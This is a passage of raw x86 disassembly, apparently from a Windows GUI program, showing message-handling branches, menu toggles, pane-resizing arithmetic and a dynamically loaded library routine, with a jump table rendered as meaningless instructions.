  402e17:	jne    0x403893
  402e1d:	mov    ecx,DWORD PTR [ebp-0x4c]
  402e20:	mov    eax,DWORD PTR [ebp-0x120]
  402e26:	cmp    ecx,DWORD PTR [eax+0x10]
  402e29:	je     0x403893
  402e2f:	push   ebx
  402e30:	push   DWORD PTR [ebp-0x3c]
  402e33:	push   ecx
  402e34:	push   esi
  402e35:	push   DWORD PTR [eax+0x8]
  402e38:	push   ebx
  402e39:	jmp    0x402c0a
  402e3e:	push   DWORD PTR [ecx]
  402e40:	push   0x401dcc
  402e45:	xor    eax,eax
  402e47:	inc    eax
  402e48:	mov    DWORD PTR [ebp-0x114],eax
  402e4e:	mov    DWORD PTR [ebp-0x134],eax
  402e54:	lea    eax,[ebp-0x54]
  402e57:	mov    DWORD PTR [ebp-0x130],eax
  402e5d:	lea    eax,[ebp-0x118]
  402e63:	mov    DWORD PTR [ebp-0x128],eax
  402e69:	lea    eax,[ebp-0x54]
  402e6c:	push   0x20
  402e6e:	push   eax
  402e6f:	mov    DWORD PTR [ebp-0x12c],ebx
  402e75:	mov    DWORD PTR [ebp-0x10c],ebx
  402e7b:	mov    DWORD PTR [ebp-0x110],ebx
  402e81:	mov    DWORD PTR [ebp-0x118],0x401db4
  402e8b:	call   0x405110
  402e90:	add    esp,0x10
  402e93:	lea    eax,[ebp-0x134]
  402e99:	push   eax
  402e9a:	push   0x404608
  402e9f:	push   edi
  402ea0:	push   0x69
  402ea2:	push   DWORD PTR ds:0x4080f4
  402ea8:	call   DWORD PTR ds:0x409394
  402eae:	jmp    0x403893
  402eb3:	shr    eax,0x10
  402eb6:	cmp    ax,0x2
  402eba:	jne    0x403893
  402ec0:	mov    ecx,DWORD PTR ds:0x408120
  402ec6:	mov    esi,DWORD PTR ds:0x409370
  402ecc:	xor    ebx,ebx
  402ece:	push   ebx
  402ecf:	push   ebx
  402ed0:	push   0x188
  402ed5:	push   ecx
  402ed6:	call   esi
  402ed8:	mov    DWORD PTR [ebp-0x11c],eax
  402ede:	cmp    eax,0xffffffff
  402ee1:	je     0x403893
  402ee7:	test   BYTE PTR ds:0x408104,0x20
  402eee:	mov    DWORD PTR [ebp-0x124],ebx
  402ef4:	je     0x402f7a
  402efa:	lea    eax,[ebp-0x118]
  402f00:	mov    DWORD PTR [ebp-0x128],eax
  402f06:	lea    eax,[ebp-0x134]
  402f0c:	push   eax
  402f0d:	push   0x404608
  402f12:	push   edi
  402f13:	push   0x69
  402f15:	push   DWORD PTR ds:0x4080f4
  402f1b:	mov    DWORD PTR [ebp-0x118],0x401e24
  402f25:	mov    DWORD PTR [ebp-0x114],0x4
  402f2f:	mov    DWORD PTR [ebp-0x110],ebx
  402f35:	mov    DWORD PTR [ebp-0x10c],0x407138
  402f3f:	mov    DWORD PTR [ebp-0x134],0x1
  402f49:	mov    DWORD PTR [ebp-0x130],0x401e2c
  402f53:	mov    DWORD PTR [ebp-0x12c],ebx
  402f59:	call   DWORD PTR ds:0x409394
  402f5f:	cmp    eax,0x1
  402f62:	jne    0x403893
  402f68:	mov    eax,DWORD PTR [ebp-0x110]
  402f6e:	mov    DWORD PTR [ebp-0x124],eax
  402f74:	mov    eax,DWORD PTR [ebp-0x11c]
  402f7a:	push   ebx
  402f7b:	push   eax
  402f7c:	push   0x199
  402f81:	push   DWORD PTR ds:0x408120
  402f87:	call   esi
  402f89:	push   ebx
  402f8a:	push   DWORD PTR [ebp-0x11c]
  402f90:	mov    esi,eax
  402f92:	push   0x182
  402f97:	push   DWORD PTR ds:0x408120
  402f9d:	call   DWORD PTR ds:0x409370
  402fa3:	push   DWORD PTR [ebp-0x124]
  402fa9:	push   esi
  402faa:	call   0x40562e
  402faf:	jmp    0x403893
  402fb4:	push   0x3
  402fb6:	call   DWORD PTR ds:0x4093b0
  402fbc:	push   eax
  402fbd:	call   DWORD PTR ds:0x409358
  402fc3:	test   eax,eax
  402fc5:	jne    0x402fd3
  402fc7:	push   0x3e9
  402fcc:	push   edi
  402fcd:	call   DWORD PTR ds:0x40939c
  402fd3:	push   eax
  402fd4:	call   DWORD PTR ds:0x4093b4
  402fda:	jmp    0x403893
  402fdf:	push   0x2
  402fe1:	call   DWORD PTR ds:0x4093b0
  402fe7:	push   eax
  402fe8:	call   DWORD PTR ds:0x409358
  402fee:	test   eax,eax
  402ff0:	jne    0x402fd3
  402ff2:	push   0x3ed
  402ff7:	jmp    0x402fcc
  402ff9:	push   0x40117c
  402ffe:	push   DWORD PTR ds:0x40811c
  403004:	call   DWORD PTR ds:0x40932c
  40300a:	jmp    0x403893
  40300f:	shr    eax,0x10
  403012:	mov    ecx,0x300
  403017:	cmp    ax,cx
  40301a:	jne    0x403893
  403020:	push   DWORD PTR ds:0x40811c
  403026:	call   DWORD PTR ds:0x409334
  40302c:	cmp    eax,0x4e20
  403031:	jle    0x40306f
  403033:	mov    esi,DWORD PTR ds:0x409370
  403039:	push   0x2710
  40303e:	xor    ebx,ebx
  403040:	push   ebx
  403041:	mov    edi,0xb1
  403046:	push   edi
  403047:	push   DWORD PTR ds:0x40811c
  40304d:	call   esi
  40304f:	push   0x40117c
  403054:	push   ebx
  403055:	push   0xc2
  40305a:	push   DWORD PTR ds:0x40811c
  403060:	call   esi
  403062:	push   0xfffffffe
  403064:	push   0xfffffffd
  403066:	push   edi
  403067:	push   DWORD PTR ds:0x40811c
  40306d:	call   esi
  40306f:	call   0x404340
  403074:	jmp    0x403893
  403079:	push   0x0
  40307b:	push   0x403ce8
  403080:	push   edi
  403081:	push   0x67
  403083:	jmp    0x402ea2
  403088:	lea    eax,[ebx-0x9c41]
  40308e:	cmp    eax,0x19
  403091:	ja     0x403893
  403097:	movzx  eax,BYTE PTR [eax+0x40391a]
  40309e:	jmp    DWORD PTR [eax*4+0x4038e2]
  4030a5:	xor    ebx,ebx
  4030a7:	push   ebx
  4030a8:	push   ebx
  4030a9:	push   0x401ab0
  4030ae:	call   DWORD PTR ds:0x409274
  4030b4:	mov    esi,eax
  4030b6:	mov    DWORD PTR [ebp-0x128],esi
  4030bc:	test   esi,esi
  4030be:	jne    0x4030d8
  4030c0:	call   DWORD PTR ds:0x4092a0
  4030c6:	push   eax
  4030c7:	push   0x401ac8
  4030cc:	call   0x40457b
  4030d1:	pop    ecx
  4030d2:	pop    ecx
  4030d3:	jmp    0x403893
  4030d8:	push   0x401af4
  4030dd:	push   esi
  4030de:	call   DWORD PTR ds:0x409270
  4030e4:	mov    DWORD PTR [ebp-0x138],eax
  4030ea:	test   eax,eax
  4030ec:	je     0x403262
  4030f2:	push   0x401b04
  4030f7:	push   esi
  4030f8:	call   DWORD PTR ds:0x409270
  4030fe:	mov    DWORD PTR [ebp-0x11c],eax
  403104:	test   eax,eax
  403106:	je     0x403262
  40310c:	push   0x401b18
  403111:	push   esi
  403112:	call   DWORD PTR ds:0x409270
  403118:	mov    DWORD PTR [ebp-0x13c],eax
  40311e:	test   eax,eax
  403120:	je     0x403262
  403126:	lea    eax,[ebp-0x4c]
  403129:	push   eax
  40312a:	push   0x20000
  40312f:	mov    DWORD PTR [ebp-0x4c],0x18
  403136:	call   DWORD PTR [ebp-0x11c]
  40313c:	test   eax,eax
  40313e:	je     0x40314b
  403140:	push   eax
  403141:	push   0x401b60
  403146:	jmp    0x40326e
  40314b:	push   DWORD PTR [ebp-0x48]
  40314e:	call   0x4045da
  403153:	mov    ecx,DWORD PTR [ebp-0x48]
  403156:	mov    esi,eax
  403158:	push   esi
  403159:	push   0x20000
  40315e:	mov    DWORD PTR [esi],ecx
  403160:	call   DWORD PTR [ebp-0x11c]
  403166:	test   eax,eax
  403168:	je     0x40317b
  40316a:	push   eax
  40316b:	push   0x401b60
  403170:	call   0x40457b
  403175:	pop    ecx
  403176:	jmp    0x403252
  40317b:	mov    eax,DWORD PTR [esi+0x14]
  40317e:	add    eax,esi
  403180:	mov    DWORD PTR [ebp-0x11c],eax
  403186:	mov    DWORD PTR [ebp-0x124],ebx
  40318c:	cmp    DWORD PTR [esi+0xc],ebx
  40318f:	jbe    0x4031dc
  403191:	mov    ecx,DWORD PTR [eax+0x8]
  403194:	add    ecx,esi
  403196:	cmp    BYTE PTR [ecx],bl
  403198:	je     0x4031a4
  40319a:	mov    eax,ecx
  40319c:	or     BYTE PTR [eax],0x20
  40319f:	inc    eax
  4031a0:	cmp    BYTE PTR [eax],bl
  4031a2:	jne    0x40319c
  4031a4:	push   0x401b9c
  4031a9:	push   ecx
  4031aa:	call   DWORD PTR ds:0x409408
  4031b0:	pop    ecx
  4031b1:	test   eax,eax
  4031b3:	mov    eax,DWORD PTR [ebp-0x11c]
  4031b9:	pop    ecx
  4031ba:	jne    0x4031d9
  4031bc:	mov    edx,DWORD PTR [ebp-0x124]
  4031c2:	add    eax,0xc
  4031c5:	inc    edx
  4031c6:	mov    DWORD PTR [ebp-0x11c],eax
  4031cc:	mov    DWORD PTR [ebp-0x124],edx
  4031d2:	cmp    edx,DWORD PTR [esi+0xc]
  4031d5:	jb     0x403191
  4031d7:	jmp    0x4031dc
  4031d9:	xor    ebx,ebx
  4031db:	inc    ebx
  4031dc:	cmp    DWORD PTR [ebp-0x120],0x9c4d
  4031e6:	jne    0x403225
  4031e8:	test   ebx,ebx
  4031ea:	je     0x4031f3
  4031ec:	push   0x401ba8
  4031f1:	jmp    0x40324d
  4031f3:	lea    eax,[ebp-0x120]
  4031f9:	push   eax
  4031fa:	push   edi
  4031fb:	push   0x401b9c
  403200:	call   DWORD PTR [ebp-0x138]
  403206:	test   eax,eax
  403208:	jne    0x40321a
  40320a:	push   DWORD PTR [ebp-0x120]
  403210:	push   0x401bc8
  403215:	jmp    0x403170
  40321a:	push   eax
  40321b:	push   0x401bec
  403220:	jmp    0x403170
  403225:	test   ebx,ebx
  403227:	je     0x403248
  403229:	push   edi
  40322a:	push   DWORD PTR [eax]
  40322c:	call   DWORD PTR [ebp-0x13c]
  403232:	test   eax,eax
  403234:	jne    0x40323d
  403236:	push   0x401c20
  40323b:	jmp    0x40324d
  40323d:	push   eax
  40323e:	push   0x401c38
  403243:	jmp    0x403170
  403248:	push   0x401c70
  40324d:	call   0x40457b
  403252:	pop    ecx
  403253:	push   esi
  403254:	call   DWORD PTR ds:0x40927c
  40325a:	mov    esi,DWORD PTR [ebp-0x128]
  403260:	jmp    0x403275
  403262:	call   DWORD PTR ds:0x4092a0
  403268:	push   eax
  403269:	push   0x401b2c
  40326e:	call   0x40457b
  403273:	pop    ecx
  403274:	pop    ecx
  403275:	push   esi
  403276:	call   DWORD PTR ds:0x40926c
  40327c:	jmp    0x403893
  403281:	xor    eax,eax
  403283:	cmp    DWORD PTR ds:0x408138,eax
  403289:	sete   al
  40328c:	mov    ds:0x408138,eax
  403291:	neg    eax
  403293:	sbb    eax,eax
  403295:	and    eax,0x8
  403298:	push   eax
  403299:	push   0x9c4c
  40329e:	push   DWORD PTR ds:0x4080f8
  4032a4:	call   DWORD PTR ds:0x409314
  4032aa:	call   0x404399
  4032af:	jmp    0x403893
  4032b4:	xor    eax,eax
  4032b6:	cmp    DWORD PTR ds:0x4080fc,eax
  4032bc:	sete   al
  4032bf:	mov    ds:0x4080fc,eax
  4032c4:	neg    eax
  4032c6:	sbb    eax,eax
  4032c8:	and    eax,0x8
  4032cb:	push   eax
  4032cc:	push   0x9c5a
  4032d1:	jmp    0x40329e
  4032d3:	xor    eax,eax
  4032d5:	cmp    DWORD PTR ds:0x408134,eax
  4032db:	sete   al
  4032de:	mov    ds:0x408134,eax
  4032e3:	neg    eax
  4032e5:	sbb    eax,eax
  4032e7:	and    eax,0x8
  4032ea:	push   eax
  4032eb:	push   0x9c56
  4032f0:	jmp    0x40329e
  4032f2:	mov    eax,ds:0x408118
  4032f7:	mov    DWORD PTR [ebp-0xcc],eax
  4032fd:	mov    eax,ds:0x408114
  403302:	mov    DWORD PTR [ebp-0xbc],eax
  403308:	mov    eax,ds:0x408110
  40330d:	mov    DWORD PTR [ebp-0xac],eax
  403313:	mov    eax,ds:0x40810c
  403318:	mov    DWORD PTR [ebp-0x9c],eax
  40331e:	mov    eax,ds:0x408108
  403323:	mov    DWORD PTR [ebp-0x8c],eax
  403329:	lea    eax,[ebp-0xd4]
  40332f:	mov    DWORD PTR [ebp-0x10c],eax
  403335:	lea    eax,[ebp-0x118]
  40333b:	push   eax
  40333c:	push   0x404608
  403341:	push   edi
  403342:	xor    ebx,ebx
  403344:	push   0x69
  403346:	push   DWORD PTR ds:0x4080f4
  40334c:	xor    esi,esi
  40334e:	inc    esi
  40334f:	mov    DWORD PTR [ebp-0xd4],0x401c90
  403359:	mov    DWORD PTR [ebp-0xd0],0x4
  403363:	mov    DWORD PTR [ebp-0xc8],0x4079c0
  40336d:	mov    DWORD PTR [ebp-0xc4],0x401ca0
  403377:	mov    DWORD PTR [ebp-0xc0],esi
  40337d:	mov    DWORD PTR [ebp-0xb8],ebx
  403383:	mov    DWORD PTR [ebp-0xb4],0x401cac
  40338d:	mov    DWORD PTR [ebp-0xb0],esi
  403393:	mov    DWORD PTR [ebp-0xa8],ebx
  403399:	mov    DWORD PTR [ebp-0xa4],0x401cc0
  4033a3:	mov    DWORD PTR [ebp-0xa0],esi
  4033a9:	mov    DWORD PTR [ebp-0x98],ebx
  4033af:	mov    DWORD PTR [ebp-0x94],0x401cd4
  4033b9:	mov    DWORD PTR [ebp-0x90],esi
  4033bf:	mov    DWORD PTR [ebp-0x88],ebx
  4033c5:	mov    DWORD PTR [ebp-0x118],0x5
  4033cf:	mov    DWORD PTR [ebp-0x114],0x401ce0
  4033d9:	mov    DWORD PTR [ebp-0x110],ebx
  4033df:	call   DWORD PTR ds:0x409394
  4033e5:	cmp    eax,esi
  4033e7:	jne    0x403893
  4033ed:	mov    eax,0x4019e0
  4033f2:	mov    DWORD PTR [ebp-0x120],eax
  4033f8:	mov    DWORD PTR [ebp-0x4c],eax
  4033fb:	mov    DWORD PTR [ebp-0x48],0x4019f8
  403402:	mov    DWORD PTR [ebp-0x44],0x401a04
  403409:	mov    DWORD PTR [ebp-0x40],0x401a14
  403410:	mov    DWORD PTR [ebp-0x3c],0x401a24
  403417:	mov    DWORD PTR [ebp-0x38],ebx
  40341a:	mov    DWORD PTR [ebp-0x18],0x408118
  403421:	mov    DWORD PTR [ebp-0x14],0x408114
  403428:	mov    DWORD PTR [ebp-0x10],0x408110
  40342f:	mov    DWORD PTR [ebp-0xc],0x40810c
  403436:	mov    DWORD PTR [ebp-0x8],0x408108
  40343d:	mov    edx,ebx
  40343f:	mov    DWORD PTR [ebp-0x11c],ebx
  403445:	mov    ecx,ebx
  403447:	lea    edi,[ebp-0xcc]
  40344d:	mov    eax,DWORD PTR [edi]
  40344f:	mov    ecx,DWORD PTR [ebp+ecx*1-0x18]
  403453:	cmp    DWORD PTR [ecx],eax
  403455:	mov    eax,DWORD PTR [ebp-0x11c]
  40345b:	je     0x403493
  40345d:	mov    eax,DWORD PTR [edi]
  40345f:	mov    DWORD PTR [ecx],eax
  403461:	push   DWORD PTR [edi]
  403463:	lea    eax,[ebp-0x34]
  403466:	push   0x401cf0
  40346b:	push   0x10
  40346d:	push   eax
  40346e:	call   0x405110
  403473:	add    esp,0x10
  403476:	lea    eax,[ebp-0x34]
  403479:	push   eax
  40347a:	push   DWORD PTR [ebp-0x120]
  403480:	push   0x407a00
  403485:	call   DWORD PTR ds:0x40928c
  40348b:	mov    eax,DWORD PTR [ebp-0x11c]
  403491:	mov    edx,esi
  403493:	inc    eax
  403494:	mov    ecx,eax
  403496:	shl    ecx,0x2
  403499:	mov    DWORD PTR [ebp-0x11c],eax
  40349f:	mov    eax,DWORD PTR [ebp+ecx*1-0x4c]
  4034a3:	add    edi,0x10
  4034a6:	mov    DWORD PTR [ebp-0x120],eax
  4034ac:	test   eax,eax
  4034ae:	jne    0x40344d
  4034b0:	mov    edi,DWORD PTR [ebp-0x124]
  4034b6:	test   edx,edx
  4034b8:	je     0x403893
  4034be:	cmp    DWORD PTR ds:0x407d34,ebx
  4034c4:	je     0x403893
  4034ca:	push   ebx
  4034cb:	push   0x401cf4
  4034d0:	push   0x401d08
  4034d5:	push   edi
  4034d6:	call   DWORD PTR ds:0x409340
  4034dc:	jmp    0x403893
  4034e1:	push   0x0
  4034e3:	push   0x403939
  4034e8:	push   edi
  4034e9:	push   0x6a
  4034eb:	jmp    0x402ea2
  4034f0:	mov    ecx,DWORD PTR ds:0x407098
  4034f6:	xor    ebx,ebx
  4034f8:	test   ecx,ecx
  4034fa:	je     0x40350d
  4034fc:	mov    eax,ds:0x4070a0
  403501:	xor    edx,edx
  403503:	div    ecx
  403505:	mov    DWORD PTR [ebp-0x12c],eax
  40350b:	jmp    0x403513
  40350d:	mov    DWORD PTR [ebp-0x12c],ebx
  403513:	mov    ecx,DWORD PTR ds:0x4070a4
  403519:	test   ecx,ecx
  40351b:	je     0x40352e
  40351d:	mov    eax,ds:0x4070ac
  403522:	xor    edx,edx
  403524:	div    ecx
  403526:	mov    DWORD PTR [ebp-0x128],eax
  40352c:	jmp    0x403534
  40352e:	mov    DWORD PTR [ebp-0x128],ebx
  403534:	push   0x8
  403536:	lea    eax,[ebp-0x12c]
  40353c:	push   eax
  40353d:	call   0x4056c5
  403542:	test   eax,eax
  403544:	jne    0x403893
  40354a:	mov    esi,DWORD PTR ds:0x409318
  403550:	inc    eax
  403551:	push   eax
  403552:	push   0x9c58
  403557:	push   DWORD PTR ds:0x4080f8
  40355d:	mov    ds:0x40813c,eax
  403562:	call   esi
  403564:	push   ebx
  403565:	push   0x9c59
  40356a:	push   DWORD PTR ds:0x4080f8
  403570:	call   esi
  403572:	jmp    0x403893
  403577:	xor    ebx,ebx
  403579:	push   ebx
  40357a:	call   0x4056f0
  40357f:	test   eax,eax
  403581:	jne    0x403893
  403587:	mov    esi,DWORD PTR ds:0x409318
  40358d:	push   0x1
  40358f:	push   0x9c59
  403594:	push   DWORD PTR ds:0x4080f8
  40359a:	mov    DWORD PTR ds:0x40813c,ebx
  4035a0:	call   esi
  4035a2:	push   ebx
  4035a3:	push   0x9c58
  4035a8:	jmp    0x40356a
  4035aa:	push   0x0
  4035ac:	push   0x403d7d
  4035b1:	push   edi
  4035b2:	push   0x6b
  4035b4:	jmp    0x402ea2
  4035b9:	mov    eax,ds:0x408100
  4035be:	lea    edi,[ebx-0x9c51]
  4035c4:	cmp    edi,eax
  4035c6:	je     0x403893
  4035cc:	mov    esi,DWORD PTR ds:0x409314
  4035d2:	push   0x0
  4035d4:	add    eax,0x9c51
  4035d9:	push   eax
  4035da:	push   DWORD PTR ds:0x4080f8
  4035e0:	call   esi
  4035e2:	push   0x8
  4035e4:	push   ebx
  4035e5:	push   DWORD PTR ds:0x4080f8
  4035eb:	mov    DWORD PTR ds:0x408100,edi
  4035f1:	call   esi
  4035f3:	jmp    0x40306f
  4035f8:	mov    eax,ds:0x408104
  4035fd:	xor    edx,edx
  4035ff:	inc    edx
  403600:	lea    ecx,[ebx-0x9c42]
  403606:	shl    edx,cl
  403608:	xor    eax,edx
  40360a:	and    edx,eax
  40360c:	neg    edx
  40360e:	sbb    edx,edx
  403610:	and    edx,0x8
  403613:	push   edx
  403614:	push   ebx
  403615:	push   DWORD PTR ds:0x4080f8
  40361b:	mov    ds:0x408104,eax
  403620:	call   DWORD PTR ds:0x409314
  403626:	jmp    0x40306f
  40362b:	xor    eax,eax
  40362d:	mov    edi,0x9c49
  403632:	cmp    ebx,edi
  403634:	setne  al
  403637:	dec    eax
  403638:	mov    ds:0x408104,eax
  40363d:	xor    eax,eax
  40363f:	mov    esi,eax
  403641:	cmp    ebx,edi
  403643:	jne    0x403648
  403645:	push   0x8
  403647:	pop    eax
  403648:	push   eax
  403649:	lea    eax,[esi+0x9c42]
  40364f:	push   eax
  403650:	push   DWORD PTR ds:0x4080f8
  403656:	call   DWORD PTR ds:0x409314
  40365c:	call   0x404340
  403661:	inc    esi
  403662:	push   0x0
  403664:	pop    eax
  403665:	cmp    esi,0x5
  403668:	jl     0x403641
  40366a:	jmp    0x403893
  40366f:	cmp    DWORD PTR ds:0x407d34,0x0
  403676:	jne    0x403893
  40367c:	call   0x404399
  403681:	push   DWORD PTR ds:0x407d30
  403687:	call   DWORD PTR ds:0x409364
  40368d:	push   DWORD PTR ds:0x407d54
  403693:	call   DWORD PTR ds:0x409254
  403699:	push   0x0
  40369b:	call   DWORD PTR ds:0x409378
  4036a1:	jmp    0x403893
  4036a6:	sub    eax,0x200
  4036ab:	je     0x403769
  4036b1:	dec    eax
  4036b2:	je     0x403727
  4036b4:	dec    eax
  4036b5:	jne    0x403893
  4036bb:	cmp    DWORD PTR ds:0x407d3c,eax
  4036c1:	je     0x403893
  4036c7:	lea    eax,[ebp-0x12c]
  4036cd:	push   eax
  4036ce:	call   DWORD PTR ds:0x409348
  4036d4:	push   0x1
  4036d6:	lea    eax,[ebp-0x12c]
  4036dc:	push   eax
  4036dd:	push   edi
  4036de:	xor    ebx,ebx
  4036e0:	push   ebx
  4036e1:	call   DWORD PTR ds:0x40934c
  4036e7:	mov    esi,DWORD PTR [ebp-0x12c]
  4036ed:	call   DWORD PTR ds:0x4093a8
  4036f3:	mov    ecx,DWORD PTR ds:0x407d50
  4036f9:	cmp    esi,ecx
  4036fb:	jge    0x4036ff
  4036fd:	mov    esi,ecx
  4036ff:	mov    eax,ds:0x40812c
  403704:	sub    eax,ecx
  403706:	cmp    esi,eax
  403708:	jle    0x40370c
  40370a:	mov    esi,eax
  40370c:	sub    esi,DWORD PTR ds:0x407d4c
  403712:	push   0x1
  403714:	add    DWORD PTR ds:0x408130,esi
  40371a:	push   ebx
  40371b:	mov    DWORD PTR ds:0x407d3c,ebx
  403721:	push   edi
  403722:	jmp    0x402a48
  403727:	mov    ecx,DWORD PTR [ebp+0x14]
  40372a:	mov    eax,ecx
  40372c:	shr    eax,0x10
  40372f:	cwde   
  403730:	cmp    eax,DWORD PTR ds:0x407d40
  403736:	jle    0x403893
  40373c:	movsx  eax,cx
  40373f:	cmp    eax,DWORD PTR ds:0x408130
  403745:	jle    0x403893
  40374b:	movzx  eax,cx
  40374e:	push   edi
  40374f:	mov    ds:0x407d4c,eax
  403754:	call   DWORD PTR ds:0x4093ac
  40375a:	mov    DWORD PTR ds:0x407d3c,0x1
  403764:	jmp    0x403893
  403769:	mov    eax,DWORD PTR [ebp+0x14]
  40376c:	movsx  esi,ax
  40376f:	shr    eax,0x10
  403772:	cwde   
  403773:	cmp    eax,DWORD PTR ds:0x407d40
  403779:	jle    0x403783
  40377b:	cmp    esi,DWORD PTR ds:0x408130
  403781:	jg     0x403790
  403783:	cmp    DWORD PTR ds:0x407d3c,0x0
  40378a:	je     0x403893
  403790:	push   0x7f84
  403795:	xor    ebx,ebx
  403797:	push   ebx
  403798:	call   DWORD PTR ds:0x40935c
  40379e:	push   eax
  40379f:	call   DWORD PTR ds:0x409344
  4037a5:	cmp    DWORD PTR ds:0x407d3c,ebx
  4037ab:	je     0x403893
  4037b1:	mov    ecx,DWORD PTR ds:0x407d50
  4037b7:	cmp    esi,ecx
  4037b9:	jge    0x4037bd
  4037bb:	mov    esi,ecx
  4037bd:	mov    eax,ds:0x40812c
  4037c2:	sub    eax,ecx
  4037c4:	cmp    esi,eax
  4037c6:	jle    0x4037ca
  4037c8:	mov    esi,eax
  4037ca:	mov    eax,ds:0x407d48
  4037cf:	push   0x40
  4037d1:	push   0x3
  4037d3:	pop    ecx
  4037d4:	add    eax,eax
  4037d6:	cdq    
  4037d7:	idiv   ecx
  4037d9:	sub    esi,DWORD PTR ds:0x407d4c
  4037df:	add    esi,DWORD PTR ds:0x408130
  4037e5:	mov    DWORD PTR [ebp-0x120],esi
  4037eb:	push   eax
  4037ec:	push   esi
  4037ed:	push   DWORD PTR ds:0x407d40
  4037f3:	push   ebx
  4037f4:	mov    ebx,DWORD PTR ds:0x409358
  4037fa:	push   ecx
  4037fb:	push   DWORD PTR ds:0x408124
  403801:	call   ebx
  403803:	mov    edi,DWORD PTR ds:0x409388
  403809:	push   eax
  40380a:	push   DWORD PTR ds:0x408124
  403810:	call   edi
  403812:	mov    ecx,DWORD PTR ds:0x407d48
  403818:	push   0x40
  40381a:	push   0x3
  40381c:	pop    esi
  40381d:	mov    eax,ecx
  40381f:	cdq    
  403820:	idiv   esi
  403822:	mov    esi,DWORD PTR ds:0x407d44
  403828:	sub    eax,esi
  40382a:	push   eax
  40382b:	push   DWORD PTR [ebp-0x120]
  403831:	lea    eax,[ecx+ecx*1]
  403834:	push   0x3
  403836:	pop    ecx
  403837:	cdq    
  403838:	idiv   ecx
  40383a:	add    eax,DWORD PTR ds:0x407d40
  403840:	add    eax,esi
  403842:	push   eax
  403843:	xor    esi,esi
  403845:	push   esi
  403846:	push   ecx
  403847:	push   DWORD PTR ds:0x408120
  40384d:	call   ebx
  40384f:	push   eax
  403850:	push   DWORD PTR ds:0x408120
  403856:	call   edi
  403858:	mov    edx,DWORD PTR [ebp-0x120]
  40385e:	mov    eax,ds:0x40812c
  403863:	mov    ecx,DWORD PTR ds:0x407d44
  403869:	push   0x40
  40386b:	push   DWORD PTR ds:0x407d48
  403871:	sub    eax,edx
  403873:	sub    eax,ecx
  403875:	push   eax
  403876:	push   DWORD PTR ds:0x407d40
  40387c:	lea    eax,[edx+ecx*1]
  40387f:	push   eax
  403880:	push   0x3
  403882:	push   DWORD PTR ds:0x40811c
  403888:	call   ebx
  40388a:	push   eax
  40388b:	push   DWORD PTR ds:0x40811c
  403891:	call   edi
  403893:	mov    ecx,DWORD PTR [ebp-0x4]
  403896:	pop    edi
  403897:	pop    esi
  403898:	xor    ecx,ebp
  40389a:	xor    eax,eax
  40389c:	pop    ebx
  40389d:	call   0x405a3a
  4038a2:	leave  
  4038a3:	ret    0x10
  4038a6:	das    
  4038a7:	sub    eax,0x2eb30040
  4038ac:	inc    eax
  4038ad:	add    BYTE PTR [ebx+0xf004038],dl
  4038b3:	xor    BYTE PTR [eax+0x0],al
  4038b6:	xchg   ebx,eax
  4038b7:	cmp    BYTE PTR [eax+0x0],al
  4038ba:	mov    ebp,DWORD PTR [edx]
  4038bc:	inc    eax
  4038bd:	add    BYTE PTR [esp+ebp*1],dl
  4038c0:	inc    eax
  4038c1:	add    BYTE PTR [ebx-0x6cffbfc8],dl
  4038c7:	cmp    BYTE PTR [eax+0x0],al
  4038ca:	stc    
  4038cb:	das    
  4038cc:	inc    eax
  4038cd:	add    BYTE PTR [ebx-0x6cffbfc8],dl
  4038d3:	cmp    BYTE PTR [eax+0x0],al
  4038d6:	mov    ah,0x2f
  4038d8:	inc    eax
  4038d9:	add    bh,bl
  4038db:	das    
  4038dc:	inc    eax
  4038dd:	add    BYTE PTR [ebp*1+0x366f0040],cl
  4038e4:	inc    eax
  4038e5:	add    al,bh
  4038e7:	xor    eax,0x362b0040
  4038ec:	inc    eax
  4038ed:	add    BYTE PTR [ecx-0x5affbfce],al
  4038f3:	xor    BYTE PTR [eax+0x0],al
  4038f6:	stos   BYTE PTR es:[edi],al
  4038f7:	xor    eax,0x35b90040
  4038fc:	inc    eax
  4038fd:	add    dl,dh
  4038ff:	xor    al,BYTE PTR [eax+0x0]
  403902:	shl    DWORD PTR [edx],cl
  403904:	inc    eax
  403905:	add    cl,ah
  403907:	xor    al,0x40
  403909:	add    al,dh
  40390b:	xor    al,0x40
  40390d:	add    BYTE PTR [edi+0x35],dh
  403910:	inc    eax
  403911:	add    BYTE PTR [edx+esi*1+0x38930040],dh
  403918:	inc    eax
  403919:	add    BYTE PTR [eax],al
  40391b:	add    DWORD PTR [ecx],eax
  40391d:	add    DWORD PTR [ecx],eax
  40391f:	add    DWORD PTR [ecx],eax
  403921:	or     eax,0x30d0202
  403926:	add    al,0x4
  403928:	add    eax,0x606060d
  40392d:	push   es
  40392e:	pop    es
  40392f:	or     BYTE PTR [ecx],cl
  403931:	or     cl,BYTE PTR [ebx]
  403933:	or     al,0xcc
  403935:	int3   
  403936:	int3   
  403937:	int3   
  403938:	int3   
  403939:	mov    edi,edi
  40393b:	push   ebp
  40393c:	mov    ebp,esp
  40393e:	sub    esp,0x48
  403941:	mov    eax,ds:0x407a10
  403946:	xor    eax,ebp
  403948:	mov    DWORD PTR [ebp-0x4],eax
  40394b:	mov    eax,DWORD PTR [ebp+0xc]
  40394e:	mov    ecx,DWORD PTR [ebp+0x10]
  403951:	push   ebx
  403952:	push   esi
  403953:	push   edi
  403954:	mov    edi,DWORD PTR [ebp+0x8]
  403957:	mov    DWORD PTR [ebp-0x48],edi
  40395a:	sub    eax,0xf
  40395d:	je     0x403ca4
  403963:	sub    eax,0x101
  403968:	je     0x403b91
  40396e:	dec    eax
  40396f:	je     0x403993
  403971:	sub    eax,0x27
  403974:	jne    0x403cd0
  40397a:	push   0xc0c0c0
  40397f:	push   ecx
  403980:	call   DWORD PTR ds:0x409248
  403986:	push   0x1
  403988:	call   DWORD PTR ds:0x409250
  40398e:	jmp    0x403cd2
  403993:	movzx  eax,cx
  403996:	dec    eax
  403997:	je     0x403b53
  40399d:	dec    eax
  40399e:	je     0x403b83
  4039a4:	sub    eax,0x3e6
  4039a9:	je     0x403b07
  4039af:	dec    eax
  4039b0:	je     0x403aaf
  4039b6:	dec    eax
  4039b7:	je     0x403a69
  4039bd:	sub    eax,0xd
  4039c0:	je     0x4039de
  4039c2:	dec    eax
  4039c3:	jne    0x403cd0
  4039c9:	push   0x6
  4039cb:	pop    ecx
  4039cc:	mov    edx,0x407d58
  4039d1:	mov    edi,edx
  4039d3:	push   edx
  4039d4:	push   DWORD PTR [ebp-0x48]
  4039d7:	rep stos DWORD PTR es:[edi],eax
  4039d9:	jmp    0x403c9d
  4039de:	shr    ecx,0x10
  4039e1:	cmp    cx,0x1
